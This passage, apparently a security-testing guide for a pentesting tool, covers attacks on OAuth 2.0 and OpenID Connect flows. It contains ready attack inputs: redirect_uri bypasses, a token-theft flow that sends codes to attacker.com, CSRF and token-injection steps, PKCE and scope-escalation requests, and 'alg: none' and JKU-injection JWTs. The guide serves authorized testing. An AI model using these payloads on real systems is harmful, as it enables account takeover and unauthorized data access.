@@ -1,0 +1,503 @@
+<oauth2_oidc_security_guide>
+<title>OAUTH 2.0 / OPENID CONNECT SECURITY TESTING</title>
+
+<critical>OAuth 2.0 and OpenID Connect are the foundation of modern authentication and authorization. Implementation flaws can lead to account takeover, unauthorized API access, and data exposure. The complexity of these protocols creates numerous attack surfaces across authorization servers, clients, and resource servers.</critical>
+
+<scope>
+- Authorization Code flow (with and without PKCE)
+- Implicit flow (deprecated but still deployed)
+- Client Credentials flow
+- Resource Owner Password Credentials flow
+- Device Authorization flow
+- Token handling (Access, Refresh, ID tokens)
+- OpenID Connect claims and scopes
+- Social login integrations
+</scope>
+
+<methodology>
+1. Map OAuth/OIDC endpoints and identify supported flows.
+2. Test redirect_uri validation for open redirect and token theft.
+3. Examine state/nonce parameters for CSRF and replay attacks.
+4. Analyze token handling for validation gaps and misuse.
+5. Test scope escalation and cross-client token usage.
+</methodology>
+
+<endpoint_discovery>
+<openid_configuration>
+{% raw %}
+# OpenID Connect Discovery
+GET /.well-known/openid-configuration
+
+# Common OAuth 2.0 endpoints
+/oauth/authorize
+/oauth/token
+/oauth/revoke
+/oauth/introspect
+/oauth/device/code
+/userinfo
+/.well-known/jwks.json
+
+# Key configuration fields
+{
+  "issuer": "https://auth.example.com",
+  "authorization_endpoint": "https://auth.example.com/authorize",
+  "token_endpoint": "https://auth.example.com/token",
+  "userinfo_endpoint": "https://auth.example.com/userinfo",
+  "jwks_uri": "https://auth.example.com/.well-known/jwks.json",
+  "response_types_supported": ["code", "token", "id_token"],
+  "grant_types_supported": ["authorization_code", "refresh_token", "client_credentials"],
+  "scopes_supported": ["openid", "profile", "email"]
+}
+{% endraw %}
+</openid_configuration>
+
+<client_identification>
+{% raw %}
+# Find client_id in:
+# - JavaScript source code
+# - Mobile app decompilation
+# - Network traffic
+# - URL parameters
+
+# Enumerate client configurations
+# Different clients may have different security settings
+{% endraw %}
+</client_identification>
+</endpoint_discovery>
+
+<redirect_uri_attacks>
+<open_redirect>
+{% raw %}
+# Test redirect_uri validation
+
+# Path traversal
+redirect_uri=https://app.com/callback/../attacker
+redirect_uri=https://app.com/callback/..%2fattacker
+
+# Subdomain bypass
+redirect_uri=https://evil.app.com/callback
+redirect_uri=https://app.com.evil.com/callback
+
+# Authority confusion
+redirect_uri=https://app.com@evil.com/callback
+redirect_uri=https://evil.com%23@app.com/callback
+redirect_uri=https://app.com%00.evil.com/callback
+
+# Fragment bypass
+redirect_uri=https://app.com/callback#.evil.com
+
+# Protocol downgrade
+redirect_uri=http://app.com/callback
+
+# Localhost variations
+redirect_uri=http://localhost:8080/callback
+redirect_uri=http://127.0.0.1/callback
+redirect_uri=http://[::1]/callback
+
+# Custom scheme (mobile apps)
+redirect_uri=myapp://callback
+redirect_uri=com.evil.app://callback
+{% endraw %}
+</open_redirect>
+
+<token_theft>
+{% raw %}
+# If redirect_uri validation is weak:
+
+# 1. Attacker sends victim to authorization URL with malicious redirect_uri
+GET /authorize?
+  response_type=code
+  &client_id=CLIENT_ID
+  &redirect_uri=https://attacker.com/steal
+  &scope=openid profile email
+  &state=random
+
+# 2. User authenticates (if not already)
+
+# 3. Authorization code sent to attacker
+GET /steal?code=AUTHORIZATION_CODE&state=random
+
+# 4. Attacker exchanges code for tokens
+POST /token
+  grant_type=authorization_code
+  &code=AUTHORIZATION_CODE
+  &redirect_uri=https://attacker.com/steal
+  &client_id=CLIENT_ID
+  &client_secret=CLIENT_SECRET
+{% endraw %}
+</token_theft>
+</redirect_uri_attacks>
+
+<state_attacks>
+<csrf_via_missing_state>
+{% raw %}
+# Login CSRF - force victim to log in as attacker
+
+# 1. Attacker initiates OAuth flow, gets authorization code
+GET /authorize?
+  response_type=code
+  &client_id=CLIENT_ID
+  &redirect_uri=https://app.com/callback
+  # Note: no state parameter
+
+# 2. Attacker stops before code exchange
+
+# 3. Attacker tricks victim into visiting:
+https://app.com/callback?code=ATTACKERS_CODE
+
+# 4. Victim is logged in as attacker (account linking)
+{% endraw %}
+</csrf_via_missing_state>
+
+<state_validation>
+{% raw %}
+# Test state parameter handling
+
+# Missing state
+# Omit state parameter entirely
+
+# Empty state
+state=
+
+# Predictable state
+state=1
+state=user123
+
+# State tampering
+# Change state between request and callback
+
+# State fixation
+# Pre-set state value for victim
+{% endraw %}
+</state_validation>
+</state_attacks>
+
+<pkce_attacks>
+<pkce_bypass>
+{% raw %}
+# Test if PKCE is enforced
+
+# 1. Initiate flow without PKCE
+GET /authorize?
+  response_type=code
+  &client_id=CLIENT_ID
+  &redirect_uri=https://app.com/callback
+  # Note: no code_challenge
+
+# 2. If code issued, exchange without code_verifier
+POST /token
+  grant_type=authorization_code
+  &code=CODE
+  &redirect_uri=https://app.com/callback
+  &client_id=CLIENT_ID
+  # Note: no code_verifier
+
+# If token is returned, PKCE is not enforced
+{% endraw %}
+</pkce_bypass>
+
+<code_verifier_manipulation>
+{% raw %}
+# Test code_verifier validation
+
+# Wrong code_verifier
+code_verifier=wrong_value
+
+# Empty code_verifier
+code_verifier=
+
+# Very long code_verifier
+code_verifier=AAAA...(very long)
+
+# Code_challenge_method bypass
+# Use plain when S256 expected
+code_challenge=VERIFIER
+code_challenge_method=plain
+{% endraw %}
+</code_verifier_manipulation>
+</pkce_attacks>
+
+<token_attacks>
+<authorization_code_attacks>
+{% raw %}
+# Code reuse
+# Can the same code be used multiple times?
+
+# Cross-client code usage
+# Can code for client_A be used with client_B?
+
+# Code without redirect_uri validation
+# Exchange code with different redirect_uri than originally used
+
+# Code leakage
+# Check if code appears in:
+# - URL fragments
+# - Referrer headers
+# - Browser history
+# - Server logs
+{% endraw %}
+</authorization_code_attacks>
+
+<access_token_attacks>
+{% raw %}
+# Token validation bypass
+
+# Expired token
+# Test if expired tokens are still accepted
+
+# Wrong audience
+# Token for API_A used on API_B
+
+# Wrong scope
+# Access resources outside token's scope
+
+# Cross-client token usage
+# Token issued for client_A used with client_B
+
+# Signature validation
+# Modified token with original signature
+{% endraw %}
+</access_token_attacks>
+
+<refresh_token_attacks>
+{% raw %}
+# Refresh token reuse after access token refresh
+# Should invalidate old refresh token (rotation)
+
+# Refresh token after revocation
+POST /revoke
+  token=REFRESH_TOKEN
+  token_type_hint=refresh_token
+
+# Then try to use revoked token
+POST /token
+  grant_type=refresh_token
+  &refresh_token=REVOKED_TOKEN
+
+# Refresh token scope escalation
+# Request broader scope on refresh
+POST /token
+  grant_type=refresh_token
+  &refresh_token=TOKEN
+  &scope=admin read write
+{% endraw %}
+</refresh_token_attacks>
+
+<id_token_attacks>
+{% raw %}
+# OpenID Connect ID Token attacks
+
+# Nonce validation
+# Missing nonce in token when expected
+# Wrong nonce value
+
+# Audience validation
+# ID token for different client
+
+# at_hash/c_hash validation
+# Missing or invalid hash values
+
+# Claims injection
+# If claims are merged from multiple sources
+
+# Subject confusion
+# Different sub values between tokens
+{% endraw %}
+</id_token_attacks>
+</token_attacks>
+
+<client_authentication>
+<client_secret_attacks>
+{% raw %}
+# Client secret exposure
+# Look in:
+# - Source code
+# - Configuration files
+# - Error messages
+# - Network traffic
+
+# Weak client secrets
+# Brute force common secrets
+
+# Missing client authentication
+# Public client claiming to be confidential
+POST /token
+  grant_type=authorization_code
+  &code=CODE
+  &redirect_uri=URI
+  &client_id=CLIENT_ID
+  # Note: no client_secret
+{% endraw %}
+</client_secret_attacks>
+
+<jwt_client_assertion>
+{% raw %}
+# client_secret_jwt and private_key_jwt attacks
+
+# Algorithm confusion
+{
+  "alg": "none"
+}
+
+# Key confusion
+# Use symmetric secret as asymmetric key
+
+# JKU injection
+{
+  "alg": "RS256",
+  "jku": "https://attacker.com/jwks.json"
+}
+{% endraw %}
+</jwt_client_assertion>
+</client_authentication>
+
+<scope_attacks>
+<scope_escalation>
+{% raw %}
+# Request more scopes than authorized
+
+# During authorization
+GET /authorize?
+  response_type=code
+  &client_id=CLIENT_ID
+  &redirect_uri=URI
+  &scope=openid profile email admin:* read:users write:users
+
+# During token refresh
+POST /token
+  grant_type=refresh_token
+  &refresh_token=TOKEN
+  &scope=admin:*
+
+# Scope injection
+scope=openid profile%20admin
+scope=openid,admin
+scope=openid admin
+{% endraw %}
+</scope_escalation>
+
+<scope_bypass>
+{% raw %}
+# Access resources without proper scope
+
+# Token without scope
+# If scope field is missing, does it have default access?
+
+# Wildcard scopes
+scope=*
+scope=read:*
+scope=admin:*
+{% endraw %}
+</scope_bypass>
+</scope_attacks>
+
+<implicit_flow_attacks>
+<token_leakage>
+{% raw %}
+# Implicit flow puts tokens in URL fragment
+
+GET /authorize?
+  response_type=token
+  &client_id=CLIENT_ID
+  &redirect_uri=https://app.com/callback
+
+# Redirect: https://app.com/callback#access_token=TOKEN
+
+# Token exposed via:
+# - Browser history
+# - Referrer header (if page has links)
+# - JavaScript access
+# - Browser extensions
+
+# response_mode manipulation
+response_mode=fragment  # Default
+response_mode=query     # Token in query string (more exposed)
+response_mode=form_post # POST to redirect_uri
+{% endraw %}
+</token_leakage>
+
+<token_injection>
+{% raw %}
+# Inject attacker's token into victim's session
+
+# Attacker obtains legitimate token for their account
+# Tricks victim into visiting:
+https://app.com/callback#access_token=ATTACKER_TOKEN
+
+# If app doesn't validate token origin, victim is logged in as attacker
+{% endraw %}
+</token_injection>
+</implicit_flow_attacks>
+
+<social_login_attacks>
+<account_linking>
+{% raw %}
+# Link attacker's social account to victim's local account
+
+# Vulnerability if:
+# - Email from social provider is trusted without verification
+# - Account linking doesn't require password confirmation
+# - State parameter is weak or missing
+
+# Attack flow:
+# 1. Attacker sets email to victim@company.com on social provider
+# 2. Attacker links social account to existing local account
+# 3. Attacker can now login as victim via social provider
+{% endraw %}
+</account_linking>
+
+<idp_confusion>
+{% raw %}
+# Mix up attack between identity providers
+
+# 1. Attacker authenticates with IdP_A
+# 2. Receives code for IdP_A
+# 3. Exchanges code as if from IdP_B
+# 4. If issuer not validated, may get access
+
+# Test cross-IdP token usage
+# Token from Google used where Facebook is expected
+{% endraw %}
+</idp_confusion>
+</social_login_attacks>
+
+<validation>
+1. Demonstrate token theft via redirect_uri manipulation.
+2. Show CSRF attack through missing state parameter.
+3. Prove PKCE bypass leading to code interception.
+4. Document scope escalation with evidence.
+5. Provide reproducible curl commands or browser requests.
+</validation>
+
+<false_positives>
+- Strict redirect_uri validation with exact matching
+- Properly enforced PKCE for public clients
+- Correct state parameter generation and validation
+- Token audience and scope validation
+- Refresh token rotation implemented
+</false_positives>
+
+<impact>
+- Complete account takeover via token theft
+- Unauthorized API access through scope escalation
+- Session hijacking via CSRF attacks
+- Data exposure through cross-client token usage
+- Privilege escalation via claim manipulation
+- Business logic bypass through token manipulation
+</impact>
+
+<pro_tips>
+1. Always test redirect_uri validation with multiple bypass techniques.
+2. Check if PKCE is enforced for public clients; many apps skip it.
+3. Test state parameter handling; missing state is common.
+4. Look for implicit flow tokens in URL history and referrers.
+5. Test cross-client token usage; clients often share token validation.
+6. Check refresh token rotation; reuse may indicate vulnerability.
+7. Test scope handling at both authorization server and resource server.
+8. Examine social login for email verification and account linking.
+9. Use the openid-configuration endpoint to understand server capabilities.
+10. Test with different response_mode values to find token exposure.
+</pro_tips>
+
+<remember>OAuth 2.0 and OIDC are complex protocols with many interacting components. Security requires proper implementation at every step: redirect_uri validation, state/PKCE for CSRF protection, token validation at resource servers, and proper scope enforcement. A single weakness in this chain can compromise the entire authentication flow.</remember>
+</oauth2_oidc_security_guide>
